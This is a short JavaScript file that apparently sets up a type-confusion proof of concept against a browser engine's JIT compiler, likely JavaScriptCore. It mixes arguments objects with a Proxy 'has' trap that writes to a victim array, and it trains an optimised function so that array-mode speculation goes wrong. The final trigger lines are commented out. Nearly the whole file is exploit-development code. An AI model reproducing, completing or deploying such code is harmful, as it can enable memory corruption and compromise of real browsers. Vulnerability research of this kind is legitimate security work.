const MAX_ITERATIONS = 4800;

function arg()
{
    return arguments;
}

let argNoArray = arg(1);

let p = new Proxy({}, {
    has: function() {
        victim[0] = {};
    }
})

let argSlowArray = arg(2);
argSlowArray.__proto__ = p;
argSlowArray[0] = 1.1;
argSlowArray[1] = 1.1;

print(describe(argSlowArray));
// readline();
let globalArr = [{}, 1.1];
globalArr[0] = argNoArray;
globalArr[1] = argSlowArray;

objStorageArray = {};
objStorageArray[0] = 1.1;
objStorageArray[0x1000] = 2.2;


objSlowArray = {};
objSlowArray[0] = 1.1;
objSlowArray.__proto__ = p;
print(describe(objSlowArray));
// readline();
// let victim = [1.1, 2.2];
let victim = [1.1, 2.2, 3.3];
victim[1] = 1;
victim.x = 1;


function opt(flag, idx)
{
    // print(idx);
    let tmp;
    // for(let i=0; i<1000000; i++) {}
    tmp = globalArr[0];
    tmp[0];  // Array::Type is Array::DirectArguments, arrayMode will be (ArrayStorageShape, NonArray);

    let tmp1;
    if(flag) {
        tmp1 = tmp;
    }
    else {
        tmp1 = objSlowArray;
        (11111)[11111111];
    }

    // idx in tmp2;
    
    // let val = victim[0];

    return tmp1[0]; 
    // return [tmp1[0], val];
}

for(let i=0; i<MAX_ITERATIONS; i++) {
    opt(false, i);
}


// globalArr[0] = argSlowArray;
// ret = opt(true, 0x10000);
// print(ret[1]);


